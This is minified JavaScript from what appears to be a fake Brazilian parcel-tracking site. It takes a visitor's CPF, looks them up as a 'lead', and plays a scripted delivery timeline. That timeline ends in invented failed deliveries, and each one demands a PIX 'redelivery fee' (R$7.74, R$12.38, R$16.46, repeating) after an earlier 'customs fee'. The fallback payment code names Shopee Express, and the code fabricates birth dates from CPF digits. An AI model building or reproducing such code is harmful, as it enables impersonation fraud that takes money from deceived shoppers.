            `,t.appendChild(o),t.style.animation="highlightSection 3s ease",setTimeout(()=>{t.scrollIntoView({behavior:"smooth",block:"center"})},200),setTimeout(()=>{o.parentNode&&o.remove(),t.style.animation=""},6e3)}}closeModal(e){const t=document.getElementById(e);t&&(t.style.display="none",document.body.style.overflow="auto")}toggleAccordion(){const e=document.getElementById("detailsContent"),t=document.querySelector(".toggle-icon");!e||!t||(e.classList.contains("expanded")?(e.classList.remove("expanded"),t.classList.remove("rotated")):(e.classList.add("expanded"),t.classList.add("rotated")))}copyPixCode(e,t){const o=document.getElementById(e),a=document.getElementById(t);if(!(!o||!a))try{o.select(),o.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(o.value).then(()=>{console.log("✅ PIX copiado via Clipboard API:",o.value.substring(0,50)+"..."),this.showCopySuccess(a)}).catch(()=>{this.fallbackCopy(o,a)}):this.fallbackCopy(o,a)}catch(i){console.error("❌ Erro ao copiar PIX:",i),d.showError("Erro ao copiar código PIX. Tente selecionar e copiar manualmente.")}}fallbackCopy(e,t){try{if(document.execCommand("copy"))console.log("✅ PIX copiado via execCommand:",e.value.substring(0,50)+"..."),this.showCopySuccess(t);else throw new Error("execCommand falhou")}catch(o){console.error("❌ Fallback copy falhou:",o),d.showError("Erro ao copiar. Selecione o texto e use Ctrl+C.")}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}handleAutoFocus(){if(new URLSearchParams(window.location.search).get("focus")==="cpf"){setTimeout(()=>{const a=document.getElementById("cpfInput");if(a){const i=document.querySelector(".tracking-hero");i&&d.scrollToElement(i,0),setTimeout(()=>{a.focus(),/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&(a.setAttribute("inputmode","numeric"),a.setAttribute("pattern","[0-9]*"),a.click())},800)}},100);const o=window.location.pathname;window.history.replaceState({},document.title,o)}}clearOldData(){try{Object.keys(localStorage).forEach(t=>{t.startsWith("tracking_")&&localStorage.removeItem(t)})}catch(e){console.error("Erro ao limpar dados antigos:",e)}}saveTrackingData(){if(this.currentCPF&&this.trackingData)try{localStorage.setItem(`tracking_${this.currentCPF}`,JSON.stringify(this.trackingData))}catch(e){console.error("Erro ao salvar dados:",e)}}getFirstAndLastName(e){const t=e.trim().split(" ");return t.length===1?t[0]:`${t[0]} ${t[t.length-1]}`}updateElement(e,t){const o=document.getElementById(e);o&&(o.textContent=t)}showElement(e){const t=document.getElementById(e);t&&(t.style.display="block")}setZentraPayApiSecret(e){const t=this.zentraPayService.setApiSecret(e);return t?console.log("✅ API Secret Zentra Pay configurada com sucesso"):console.error("❌ Falha ao configurar API Secret Zentra Pay"),t}}window.setZentraPayApiSecret=function(m){return window.trackingSystemInstance?window.trackingSystemInstance.setZentraPayApiSecret(m):(window.ZENTRA_PAY_SECRET_KEY=m,localStorage.setItem("zentra_pay_secret_key",m),console.log("🔑 API Secret armazenada para uso posterior"),!0)};window.valor_em_reais=26.34;class v{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.deliveryValues=[7.74,12.38,16.46],this.isProcessing=!1,this.timers=[],this.currentStep=0,this.deliveryPixData=null,console.log("🚀 Sistema de fluxo pós-pagamento inicializado"),console.log("💰 Valores de tentativa:",this.deliveryValues)}startPostPaymentFlow(){console.log("🚀 Iniciando fluxo pós-pagamento..."),this.addSimulationControls(),this.addTimelineStep({stepNumber:1,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,nextStepDelay:2*60*60*1e3}),this.addTimelineStep({stepNumber:2,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:2*60*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:3,title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:2*60*60*1e3+30*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:3*60*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:5,title:"Tentativa de entrega",description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:3*60*60*1e3+30*60*1e3,isDeliveryAttempt:!0,nextStepDelay:30*60*1e3})}addSimulationControls(){if(!document.querySelector(".tracking-results")||document.getElementById("simulationControls"))return;const t=document.createElement("div");t.id="simulationControls",t.style.cssText=`
            background: #f8f9fa;
            border: 2px dashed #ff6b35;
            border-radius: 10px;
            padding: 15px;
            margin: 20px auto;
            max-width: 700px;
            text-align: center;
        `,t.innerHTML=`
            <h4 style="margin-bottom: 15px; color: #2c3e50; font-size: 1.1rem;">Controles de Simulação</h4>
            <div style="display: flex; flex-wrap: wrap; gap: 10px; justify-content: center;">
                <button class="simulation-button" data-step="1">
                    <i class="fas fa-unlock"></i> Simular Liberação
                </button>
                <button class="simulation-button" data-step="2">
                    <i class="fas fa-box"></i> Simular Saída para Entrega
                </button>
                <button class="simulation-button" data-step="3">
                    <i class="fas fa-truck"></i> Simular Em Trânsito
                </button>
                <button class="simulation-button" data-step="4">
                    <i class="fas fa-route"></i> Simular Rota de Entrega
                </button>
                <button class="simulation-button" data-step="5">
                    <i class="fas fa-home"></i> Simular Tentativa de Entrega
                </button>
            </div>
            <p style="margin-top: 10px; font-size: 0.9rem; color: #6c757d;">
                Estes botões simulam o progresso do rastreamento sem esperar pelos atrasos reais.
            </p>
        `;const o=document.createElement("style");o.textContent=`
            .simulation-button {
                background: linear-gradient(45deg, #ff6b35, #f7931e);
                color: white;
                border: none;
                padding: 8px 15px;
                font-size: 0.9rem;
                font-weight: 600;
                border-radius: 20px;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 2px 8px rgba(255, 107, 53, 0.3);
                display: inline-flex;
                align-items: center;
                gap: 6px;
            }
            
            .simulation-button:hover {
                transform: translateY(-2px);
                box-shadow: 0 4px 12px rgba(255, 107, 53, 0.5);
            }
            
            @media (max-width: 768px) {
                .simulation-button {
                    font-size: 0.8rem;
                    padding: 6px 12px;
                }
            }
        `,document.head.appendChild(o);const a=document.querySelector(".footer");a?document.body.insertBefore(t,a):document.body.appendChild(t),t.querySelectorAll(".simulation-button").forEach(s=>{s.addEventListener("click",()=>{const n=parseInt(s.dataset.step);this.simulateStep(n)})})}simulateStep(e){switch(console.log(`🎮 Simulando etapa ${e}`),this.clearAllTimers(),e){case 1:this.addTimelineStep({stepNumber:1,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,nextStepDelay:0});break;case 2:this.addTimelineStep({stepNumber:2,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:0,nextStepDelay:0});break;case 3:this.addTimelineStep({stepNumber:3,title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:0,nextStepDelay:0});break;case 4:this.addTimelineStep({stepNumber:4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:0,nextStepDelay:0});break;case 5:this.addTimelineStep({stepNumber:5,title:"Tentativa de entrega",description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:0,isDeliveryAttempt:!0,nextStepDelay:0});break}}addTimelineStep({stepNumber:e,title:t,description:o,delay:a,nextStepDelay:i,isDeliveryAttempt:s=!1}){const n=setTimeout(()=>{console.log(`📦 Adicionando etapa ${e}: ${t}`);const r=document.getElementById("trackingTimeline");if(!r)return;const c=new Date,u=this.createTimelineItem({stepNumber:e,title:t,description:o,date:c,completed:!0,isDeliveryAttempt:s,nextStepDelay:i});r.appendChild(u),setTimeout(()=>{u.style.opacity="1",u.style.transform="translateY(0)"},100),u.scrollIntoView({behavior:"smooth",block:"center"}),this.currentStep=e},a);this.timers.push(n)}createTimelineItem({stepNumber:e,title:t,description:o,date:a,completed:i,isDeliveryAttempt:s}){const n=document.createElement("div");n.className=`timeline-item ${i?"completed":""}`,n.style.opacity="0",n.style.transform="translateY(20px)",n.style.transition="all 0.5s ease";const r=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),c=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let u="";if(s&&(u=`
                <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${this.deliveryAttempts}">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `),n.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${r}</span>
                    <span class="time">${c}</span>
                </div>
                <div class="timeline-text">
                    <p>${o}</p>
                    ${u}
                </div>
            </div>
        `,s){const l=n.querySelector(".delivery-retry-btn");l&&this.configureDeliveryRetryButton(l)}return n}configureDeliveryRetryButton(e){e.style.cssText=`
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            animation: pulse 2s infinite;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
            margin-top: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        `,e.addEventListener("click",()=>{this.handleDeliveryRetry(e)}),console.log("🔄 Botão de reenvio configurado")}async handleDeliveryRetry(e){if(this.isProcessing)return;this.isProcessing=!0;const t=parseInt(e.dataset.attempt),o=this.deliveryValues[t%this.deliveryValues.length];console.log(`🔄 Processando reenvio - Tentativa ${t+1} - R$ ${o.toFixed(2)}`),this.showDeliveryLoadingNotification();try{console.log("🚀 Gerando PIX para tentativa de entrega via Zentra Pay...");const a=await this.trackingSystem.zentraPayService.createPixTransaction(this.trackingSystem.userData,o);if(a.success)console.log("🎉 PIX de reenvio gerado com sucesso!"),this.deliveryPixData=a,this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(o,t+1)},300);else throw new Error(a.error||"Erro ao gerar PIX de reenvio")}catch(a){console.error("💥 Erro ao gerar PIX de reenvio:",a),this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(o,t+1,!0)},300)}}showDeliveryLoadingNotification(){const e=document.createElement("div");e.id="deliveryLoadingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reenvio...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeDeliveryLoadingNotification(){const e=document.getElementById("deliveryLoadingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showDeliveryPixModal(e,t,o=!1){const a=document.createElement("div");a.className="modal-overlay",a.id="deliveryPixModal",a.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let i,s;!o&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(i=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,s=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para reenvio")):(i="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",s="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para reenvio")),a.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${t}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${e.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${t}° Tentativa</span>
                            <span class="fee-amount">R$ ${e.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${i}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${s}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de simulação para testes -->
                        <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed #e9ecef; text-align: center;">
                            <p style="margin-bottom: 15px; color: #6c757d; font-size: 14px;">
                                Apenas para testes:
                            </p>
                            <button id="simulateDeliveryPaymentButton" class="professional-copy-button" style="background: #6c757d;">
                                <i class="fas fa-bolt"></i> Simular Pagamento
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(a),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(a,t),console.log(`💳 Modal de PIX para ${t}° tentativa exibido - R$ ${e.toFixed(2)}`)}setupDeliveryModalEvents(e,t){const o=e.querySelector("#closeDeliveryPixModal");o&&o.addEventListener("click",()=>{this.closeDeliveryPixModal()});const a=e.querySelector("#copyDeliveryPixButton");a&&a.addEventListener("click",()=>{this.copyDeliveryPixCode()});const i=e.querySelector("#simulateDeliveryPaymentButton");i&&i.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),e.addEventListener("click",s=>{s.target===e&&this.closeDeliveryPixModal()})}simulateDeliveryPayment(e){this.closeDeliveryPixModal(),this.showDeliverySuccessNotification(e),setTimeout(()=>{this.processDeliveryRetry(e)},1500)}showDeliverySuccessNotification(e){const t=document.createElement("div");t.className="payment-success-notification",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Reenvio agendado com sucesso.</div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&t.remove()},5e3)}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de reenvio copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX de reenvio:",o)}}fallbackCopy(e,t){try{document.execCommand("copy")&&(console.log("✅ PIX de reenvio copiado via execCommand"),this.showCopySuccess(t))}catch(o){console.error("❌ Fallback copy falhou:",o)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}closeDeliveryPixModal(){const e=document.getElementById("deliveryPixModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300)),this.isProcessing=!1}processDeliveryRetry(e){this.hideCurrentRetryButton(e-1),this.deliveryAttempts=e,this.deliveryAttempts>=3&&(this.deliveryAttempts=0),console.log(`✅ Reenvio ${this.deliveryAttempts} processado com sucesso`),console.log(`💰 Próximo valor será: R$ ${this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length].toFixed(2)}`),setTimeout(()=>{this.startDeliveryFlow()},2e3)}hideCurrentRetryButton(e){const t=document.querySelector(`[data-attempt="${e}"]`);t&&(t.closest(".timeline-item").style.display="none")}startDeliveryFlow(){console.log("🚚 Iniciando novo fluxo de entrega..."),this.isProcessing=!1;const e=100+this.deliveryAttempts*10;this.addTimelineStep({stepNumber:e+1,title:"Pedido sairá para entrega",description:"Seu pedido está sendo preparado para nova tentativa de entrega",delay:0,nextStepDelay:30*60*1e3})}isBusinessHour(e){const t=e.getHours(),o=e.getDay();return o>=1&&o<=5&&t>=8&&t<18}getNextBusinessTime(e){const t=new Date(e);return t.getDay()===0?t.setDate(t.getDate()+1):t.getDay()===6&&t.setDate(t.getDate()+2),t.getHours()>=18?(t.setDate(t.getDate()+1),t.setHours(8,0,0,0)):t.getHours()<8&&t.setHours(8,0,0,0),t}clearAllTimers(){this.timers.forEach(e=>clearTimeout(e)),this.timers=[],console.log("🧹 Todos os timers foram limpos")}reset(){this.clearAllTimers(),this.deliveryAttempts=0,this.isProcessing=!1,this.currentStep=0,this.deliveryPixData=null,this.closeDeliveryPixModal(),console.log("🔄 Sistema resetado")}getStatus(){return{deliveryAttempts:this.deliveryAttempts,isProcessing:this.isProcessing,currentStep:this.currentStep,activeTimers:this.timers.length,currentDeliveryValue:this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length],deliveryValues:this.deliveryValues,hasDeliveryPixData:!!this.deliveryPixData}}}const k=Object.freeze(Object.defineProperty({__proto__:null,PostPaymentSystem:v},Symbol.toStringTag,{value:"Module"}));class A extends T{constructor(){super(),this.dbService=new P,this.isVegaOrigin=!1,this.leadData=null,this.postPaymentSystem=null}async init(){if(!this.isInitialized){console.log("🚀 Inicializando sistema de rastreamento aprimorado");try{this.checkOrigin(),await super.init(),this.isVegaOrigin&&await this.handleVegaOrigin(),console.log("✅ Sistema de rastreamento aprimorado inicializado")}catch(e){console.error("❌ Erro na inicialização do sistema aprimorado:",e)}}}checkOrigin(){const e=new URLSearchParams(window.location.search);this.isVegaOrigin=e.get("origem")==="vega",this.isVegaOrigin?console.log("📦 Origem detectada: Vega Checkout"):console.log("🔍 Origem detectada: Rastreamento direto")}async handleVegaOrigin(){const t=new URLSearchParams(window.location.search).get("cpf");if(t){console.log("🔍 Buscando dados do lead para CPF:",t);const o=await this.dbService.getLeadByCPF(t);o.success&&o.data?(this.leadData=o.data,console.log("✅ Dados do lead encontrados:",this.leadData),await this.autoFillAndTrack(t)):(console.log("⚠️ Lead não encontrado, criando dados mock"),this.leadData=x.generateMockVegaData(t),await this.dbService.createLead(this.leadData),await this.autoFillAndTrack(t))}}async autoFillAndTrack(e){const t=document.getElementById("cpfInput");t&&(t.value=g.formatCPF(e),setTimeout(()=>{this.handleTrackingSubmit()},1e3))}async handleTrackingSubmit(){return console.log("🔍 Iniciando rastreamento aprimorado"),this.isVegaOrigin&&this.leadData?this.handleVegaTracking():super.handleTrackingSubmit()}async handleVegaTracking(){console.log("📦 Processando rastreamento Vega");const{UIHelpers:e}=await f(async()=>{const{UIHelpers:t}=await Promise.resolve().then(()=>I);return{UIHelpers:t}},void 0);e.showLoadingNotification();try{await new Promise(o=>setTimeout(o,2e3)),this.currentCPF=this.leadData.cpf.replace(/[^\d]/g,""),this.userData={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,nascimento:this.generateBirthDate(this.leadData.cpf),situacao:"REGULAR"},e.closeLoadingNotification(),this.displayOrderDetails(),this.generateEnhancedTrackingData(),this.displayTrackingResults();const t=document.getElementById("orderDetails");t&&e.scrollToElement(t,100),setTimeout(()=>{this.highlightLiberationButton(),this.initializePostPaymentSystem()},1500)}catch(t){console.error("❌ Erro no rastreamento Vega:",t),e.closeLoadingNotification(),e.showError("Erro ao processar rastreamento")}}highlightLiberationButton(){super.highlightLiberationButton(),setTimeout(()=>{this.initializePostPaymentSystem()},1e3)}initializePostPaymentSystem(){this.postPaymentSystem||(this.postPaymentSystem=new v(this),console.log("🚀 Sistema pós-pagamento inicializado"))}generateEnhancedTrackingData(){const{TrackingGenerator:e}=require("../utils/tracking-generator.js");this.trackingData=e.generateTrackingData(this.userData),this.leadData&&this.leadData.etapa_atual&&(this.trackingData.currentStep=this.getStepNameByNumber(this.leadData.etapa_atual),this.trackingData.steps.forEach((t,o)=>{t.completed=o<this.leadData.etapa_atual})),this.leadData&&this.leadData.status_pagamento==="pago"&&(this.trackingData.liberationPaid=!0)}getStepNameByNumber(e){return{1:"created",2:"preparing",3:"shipped",4:"in_transit",5:"customs",6:"delivered"}[e]||"customs"}generateBirthDate(e){const t=e.replace(/[^\d]/g,""),o=1960+parseInt(t.slice(0,2))%40,a=parseInt(t.slice(2,4))%12+1;return`${(parseInt(t.slice(4,6))%28+1).toString().padStart(2,"0")}/${a.toString().padStart(2,"0")}/${o}`}async updateLeadStage(e){if(this.leadData&&this.leadData.cpf)try{await this.dbService.updateLeadStage(this.leadData.cpf,e),console.log("✅ Etapa do lead atualizada:",e)}catch(t){console.error("❌ Erro ao atualizar etapa do lead:",t)}}async updatePaymentStatus(e){if(this.leadData&&this.leadData.cpf)try{await this.dbService.updatePaymentStatus(this.leadData.cpf,e),console.log("✅ Status de pagamento atualizado:",e)}catch(t){console.error("❌ Erro ao atualizar status de pagamento:",t)}}cleanup(){this.postPaymentSystem&&this.postPaymentSystem.reset(),console.log("🧹 Sistema de rastreamento limpo")}}(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let m;function e(){console.log("=== INICIALIZANDO PÁGINA DE RASTREAMENTO APRIMORADA ===");try{b.init(),console.log("✓ Navegação inicializada"),m||(m=new A,window.trackingSystemInstance=m,console.log("✓ Sistema de rastreamento aprimorado criado")),a(),console.log("✓ Header scroll configurado"),o(),t(),console.log("=== PÁGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===")}catch(i){console.error("❌ Erro na inicialização da página de rastreamento:",i),setTimeout(e,2e3)}}function t(){const i=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");i&&i!=="SUA_SECRET_KEY_AQUI"&&m?(m.setZentraPayApiSecret(i),console.log("✓ API Secret Zentra Pay configurada automaticamente")):console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")')}function o(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(s=>{document.getElementById(s)?console.log(`✓ Elemento encontrado: ${s}`):console.warn(`⚠️ Elemento não encontrado: ${s}`)})}function a(){window.addEventListener("scroll",function(){const i=document.querySelector(".header");i&&(window.scrollY>100?(i.style.backgroundColor="rgba(255, 255, 255, 0.95)",i.style.backdropFilter="blur(10px)"):(i.style.backgroundColor="#fff",i.style.backdropFilter="none"))})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("📅 Aguardando DOMContentLoaded")):(e(),console.log("📄 DOM já carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
